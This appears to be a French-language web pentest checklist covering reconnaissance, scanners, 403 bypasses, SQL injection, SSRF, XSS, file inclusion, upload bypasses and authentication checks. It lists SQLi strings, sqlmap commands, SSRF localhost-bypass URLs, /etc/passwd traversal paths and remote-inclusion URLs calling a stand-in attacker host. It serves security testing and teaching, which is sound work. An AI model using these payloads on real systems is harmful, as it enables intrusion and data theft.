---
layout: archive
title: "Web Checklist"
permalink: /web-checklist/
author_profile: true
redirect_from:

---

{% include base_path %}

Avant de commencer à vous présenter ma checklist, j'utilise pour prendre des notes [mind42.com](https://mind42.com/).
<br/>Un moyen simple et surtout visuel de gérer correctement votre pentest 😄
<br/>Bonne chance à vous 😋
<br/>

Phase de reconnaissance
======
* Obtenir l'ASN pour trouver les plages IP avec [bgp.he.net](https://bgp.he.net/)
* Examiner les acquisitions avec [crunchbase.com](https://www.crunchbase.com/)
<br/>
<br/>

* Recenser les sous-domaines via OSINT (subfinder, assetfinder, amass)
* Recenser les sous-domaines via Brute Force (gobuster dns -d DOMAINE -t 50 -w /usr/share/spiderfoot/dicts/subdomains.txt)
* Recenser les virtual hosts via Brute Force (gobuster vhost -u URL -t 150 -w /usr/share/wordlist/Seclists/Discovery/DNS/subdomains-top1million-110000.txt)
* [shodan.io](https://www.shodan.io/)
* Transfert de zone (dig)
* Captures d'écran avec [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness)
<br/>
<br/>

* Identifier la présence d'un WAF (wafw00f)
* Identifier le serveur web et les technologies avec [wappalyzer](https://github.com/AliasIO/wappalyzer) et [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
* Vérifier /robots.txt /crossdomain.xml /clientaccesspolicy.xml /sitemap.xml /.well-known/
* Examiner les commentaires présent dans le code source (Burp Engagement Tools)
* Enumération des répertoires (gobuster -u SITE -w WORDLIST)
* Leak ([dehashed.com](https://www.dehashed.com/), [pwndb](https://github.com/davidtavarez/pwndb), [breachdirectory.org](https://breachdirectory.org/))
* Google dork ([faisalahmed.me](https://dorks.faisalahmed.me/))
* Obtenir des urls ([gau](https://github.com/lc/gau) , [waybackurls](https://github.com/tomnomnom/waybackurls))
* Vérifier les urls potentiellement vulnérables ([gf-patterns](https://github.com/1ndianl33t/Gf-Patterns))
* Trouver des paramètres cachés ([paramspider](https://github.com/devanshbatham/ParamSpider))
* Recherche automatique de XSS ([dalfox](https://github.com/hahwul/dalfox))
* Recherche de fichiers de sauvegarde ([bfac](https://github.com/mazen160/bfac))
* Localiser les pages d'administration et de connexion
* Obtenir tous les fichiers JS (Burp suite extension : JS Link Finder)
* Analyse JS (JSParser, JSFScan, JSScanner, jshole)
* Exécution d'un scanner automatisé ([rengine](https://github.com/yogeshojha/rengine))
* Test CORS ([CORScanner](https://github.com/chenjj/CORScanner))

<br/>

Scanners automatiques
======
Quelques scanners standards 
* nikto
* ZAP
* Burp
* [nuclei](https://github.com/projectdiscovery/nuclei)

<br/>Si un CMS est utilisé, n'oubliez pas de lancer un scanner en début de pentest 😉

* [CMSScan](https://github.com/ajinabraham/CMSScan) 
* [CMSmap](https://github.com/Dionach/CMSmap)
* wpscan
* [joomscan](https://github.com/OWASP/joomscan)

<br/>

SSL/TLS vulnerabilités
======
Si le HTTP est uniquement utilisé et sert pour de l'envoi de données sensibles alors check [ici](https://cwe.mitre.org/data/definitions/319.html).
<br/>Scanner utile : 

* [testssl.sh](https://github.com/drwetter/testssl.sh)

<br/>

Bypass 403 / 401
======
* Essayez d'utiliser différents "verbs" via Burp pour accéder au fichier : GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK
* Changer l'en-tête Host pour une valeur arbitraire
* Fuzz HTTP Headers avec [ce tool](https://github.com/carlospolop/fuzzhttpbypass)
* Changer le protocole : HTTP -> HTTPS ou inversement
* Vérifier si la ressource était accessible dans le passé via [archive.org](https://archive.org/web/)

<br/>

Failles applicatives
======

SQL INJECTIONS
======
L'injection SQL est une vulnérabilité de sécurité web qui permet à un attaquant d'interférer avec les requêtes qu'une application effectue dans sa base de données. 
<br/>Elle permet généralement à un attaquant de visualiser des données qu'il n'est normalement pas en mesure de récupérer. 
<br/>Il peut s'agir de données appartenant à d'autres utilisateurs, ou de toute autre donnée à laquelle l'application elle-même peut accéder. 
<br/>Dans de nombreux cas, un attaquant peut modifier ou supprimer ces données, ce qui entraîne des changements persistants dans le contenu ou le comportement de l'application.

<br/>

**Tests classiques**
* ' or 1=1 LIMIT 1 --
* ' or 1=1 LIMIT 1 -- -
* ' or 1=1 LIMIT 1#
* 'or 1#
* ' or 1=1 --
* ' or 1=1 -- -
* admin\'-- -


**SQLMap - Cheatsheet**

* **POST :** sqlmap -r req.txt -p pass
* **GET :** sqlmap -u "http://127.0.0.1/index.php?id=1" --dbs
* **AUTO - FORMS :** sqlmap -u 'http://127.0.0.1/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch


**Sources utiles**
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [Guide-to-sql-injection](https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli)

<br/>

SSRF (Server Side Request Forgery)
======
Server-side request forgery (également connue sous le nom de SSRF) est une vulnérabilité Web qui permet à un attaquant d'inciter l'application côté serveur à effectuer des requêtes HTTP vers un domaine arbitraire choisi par l'attaquant. 

<br/> 

**Choses à tester**
* Accès aux fichiers locaux (file://)
* Essayer d'accéder à l'IP locale 
* Contournement de l'IP locale
* Usurpation de DNS (domaines pointant vers 127.0.0.1)
* Accès à du contenu privé (filtré par IP ou uniquement accessible localement, comme le repertoire /admin).



**Outil**
* [redirector](https://tools.intigriti.io/redirector/)



**Bypass localhost**
* http://127.0.0.1:80
* http://127.0.0.1:443
* http://127.0.0.1:22
* http://127.1:80
* http://0
* http://0.0.0.0:80
* http://localhost:80
* http://[::]:80/
* http://[::]:25/ SMTP
* http://[::]:3128/ Squid
* http://[0000::1]:80/
* http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
* http://①②⑦.⓪.⓪.⓪

<br/>

XSS (Cross Site Scripting)
======
Le cross-site scripting (également connu sous le nom de XSS) est une vulnérabilité web qui consiste à manipuler un site web vulnérable de manière à ce qu'il renvoie du JavaScript malveillant aux utilisateurs. 
<br/>Lorsque le code malveillant s'exécute dans le navigateur d'une victime, l'attaquant peut compromettre totalement son interaction avec l'application.
<br/>

**Quels sont les types d'attaques XSS ?**
<br/>Il existe trois principaux types d'attaques XSS. Il s'agit de :

* **XSS réfléchi**, peut être qualifié de « non permanent », est de loin le plus commun. Il apparaît lorsque des données fournies par un client web sont utilisées telles quelles par les scripts du serveur pour produire une page de résultats. Si les données non vérifiées sont incluses dans la page de résultat sans encodage des entités HTML, elles pourront être utilisées pour injecter du code dans la page dynamique reçue par le navigateur client.
* **XSS stocké**, faille permanente ou du second ordre permet des attaques puissantes. Elle se produit quand les données fournies par un utilisateur sont stockées sur un serveur (dans une base de données, des fichiers, ou autre), et ensuite ré-affichées sans que les caractères spéciaux HTML aient été encodés.
* **DOM-based XSS**, le problème est dans le script d'une page côté client. Par exemple, si un fragment de JavaScript accède à un paramètre d'une requête d'URL, et utilise cette information pour écrire du HTML dans sa propre page, et que cette information n'est pas encodée sous forme d'entités HTML, alors il y a probablement une vulnérabilité de type XSS.

<br/>

**Outils:**
* [beef-xss](https://github.com/beefproject/beef)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

<br/>

File Inclusion/Path traversal
======
**Remote File Inclusion (RFI)** : Le fichier est chargé à partir d'un serveur distant.
<br/> **Local File Inclusion (LFI)** : Le serveur charge un fichier local.
<br/>La vulnérabilité se produit lorsque l'utilisateur peut contrôler d'une manière ou d'une autre le fichier qui va être chargé par le serveur.
<br/> **Fonctions PHP vulnérables** : require, require_once, include, include_once.
<br/>

**LFI classique**
* http://test.fr/index.php?page=../../../etc/passwd

**RFI classique**
* http://test.fr/index.php?page=http://atacker.com/exploit.php
* http://test.fr/index.php?page=\\attacker.com\shared\exploit.php


**LFI bypass**
* http://test.fr/index.php?page=....//....//....//etc/passwd
* http://test.fr/index.php?page=....\/....\/....\/etc/passwd
* http://test.fr/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd


**Les 25 paramètres les plus vulnérables à une LFI** 
<br/>

![paramlfi](/files/paramlfi.jpg)

**Outils**
* [fimap](https://github.com/kurobeats/fimap)
* [Kadimus](https://github.com/P0cL4bs/Kadimus)

<br/>

File Upload
======
La **faille d'upload de fichier** est une faille permettant d'uploader des fichiers avec une extension non autorisée, cette faille est due à la mauvaise configuration du script d'upload ou à l'absence complète de sécurité. Celle ci est généralement présente dans les scripts d'upload d'images.
<br/>

**Extensions classiques**
* **PHP**: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
* **ASP**: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
* **Jsp**: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
* **Perl**: .pl, .cgi

**Bypass**
* Utilisation de majuscules (**exemple**: *pHP5*)
* Utiliser des extensions avant ou après / ajouter une couche supplémentaire(*file.png.php* ; *file.php.png* ; *file.png.jpg.php*)
* Ajouter des caractères spéciaux (**exemple**: *file.php%0a*)
* Trouver une faille pour renommer le fichier déjà téléchargé (pour changer l'extension).
* Modifier le type MIME de la requête POST (**exemple**: Content-type: application/x-php >> Content-type: image/jpeg)
* [Magic-bytes](https://systemweakness.com/bypassing-file-upload-restriction-using-magic-bytes-eb13e801f264)
* [Polyglot-Files](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)




<br/>

Contrôle d'accès & Authentification
======
A l’aide de mécanismes d’authentification, le contrôle d’accès vise à s’assurer que les 
ressources hébergées sur un serveur ne sont accessibles qu’aux personnes autorisées. 
<br/>Ces mécanismes d’authentification font appel à des fonctionnalités variées : cookies de
session, mire d’authentification, .htaccess, etc. 
<br/>Cette étape vise à examiner les moyens de contournement de ces mécanismes afin de 
s’affranchir du contrôle d’accès ou d’élever son niveau de privilèges.
<br/>
<br/>

**Vérifier les messages d’erreurs d’authentification**
<br/>

*Les messages d’échec de connexion ne doivent pas indiquer l’origine de l’erreur (identifiant inconnu ou mot de passe invalide par exemple), car cela fournit des informations précieuses à un attaquant.*
<br/>

*En effet, lors d’une attaque par force brute par exemple, un message d’échec de connexion tel que « mot de passe invalide » permet à un attaquant de se concentrer sur l’identifiant renseigné, ce qui lui fait gagner beaucoup de temps.*
<br/>

*De plus, cela facilite l’énumération d’utilisateurs et donc des fuites de données lorsque l’identifiant est l’adresse email de l’utilisateur (ce qui est par ailleurs assez fréquent). Ces données peuvent être utilisées dans des attaques d’ingénierie sociale et notamment de spear phishing.*

**Vérifier si la politique de mot de passe est assez robuste**
<br/>

*La sécurité de l’authentification passe naturellement par la mise en place d’une politique de mot de passe efficace. En premier lieu, la complexité du mot passe qui doit être imposée lors de la création d’un compte : il doit être suffisamment long (10 à 12 caractères) et intégrer des caractères spéciaux, minuscules et majuscules.*

**Vérifier que tous les contrôles d’authentification sont réalisés côté serveur et non côté client.**
<br/>

**Vérifier que le mot de passe de l'utilisateur soit demandé avant toute opération sensible (modification d’informations sensibles : mot de passe, comptes de messagerie, informations de paiement, etc.).**
<br/>

**Vérifier si le système de réinitialisation de mots de passe est sécurisé.**
<br/>

*La fonction « mot de passe oublié » et les autres chemins de récupération ne doivent pas révèler le mot de passe actuel ; et le nouveau mot de passe ne doit jamais être envoyé en clair à l’utilisateur.*
<br/>

*Un token unique, composé d’une chaine de caractères aléatoire, doit être généré à chaque demande de réinitialisation puis invalidé une fois la réinitialisation effectuée.*

**Vérifier que des mesures techniques anti « brute force » soient présentes**
<br/>

**Vérifier que les attributs sécurisés pour les cookies de session, notamment HTTPOnly, secure et samesite soient présents.**
<br/>

*HTTPOnly permet d’éviter que l’identifiant de session soit accessible aux scripts Javascript, ce qui permet de contrer certaines méthodes de vol de session.*
<br/>

*L’attribut « Secure » quant à lui, informe les navigateurs que l’identifiant de session ne doit transiter que via des canaux HTTPS, ce qui permet de contrer certaines attaques basées sur l’écoute du réseau.*
<br/>

*Enfin, l’attribut « samesite » qui permet de se protéger contre des attaques de type CSRF.*

**Vérifier que les identifiants de session ne soient pas exposé dans les URLs**

**Vérifier que la session soit détruite lorsqu’un utilisateur se déconnecte de l’application.**

**Vérifier que les fonctionnalités sensibles soient protégées**
<br/>

*Dans sa forme la plus élémentaire, l'élévation verticale des privilèges survient lorsqu'une application n'applique aucune protection sur les fonctionnalités sensibles. Par exemple, les fonctions administratives peuvent être liées à partir de la page d'accueil d'un administrateur mais pas à partir de la page d'accueil d'un utilisateur. Cependant, un utilisateur peut simplement accéder aux fonctions d'administration en accédant directement à l'URL d'administration appropriée.*
<br/>

*Cela peut en fait être accessible par n'importe quel utilisateur, pas seulement les utilisateurs administratifs qui ont un lien vers la fonctionnalité dans leur interface utilisateur. Dans certains cas, l'URL d'administration peut être divulguée à d'autres emplacements, tels que le fichier robots.txt*

**Vérifier la modification de l'id de session dans l'URL**
<br/>

*Les attaques d'élévation horizontale des privilèges peuvent utiliser des types de méthodes d'exploitation similaires à l'élévation verticale des privilèges. Par exemple, un utilisateur peut généralement accéder à la page de son propre compte à l'aide d'une URL comme celle-ci :*
<br/>

*https://localhost/myaccount?id=123*
<br/>

*Désormais, si un attaquant modifie la valeur "id" du paramètre pour celle d'un autre utilisateur, il peut alors accéder à la page de compte d'un autre utilisateur, avec les données et les fonctions associées.*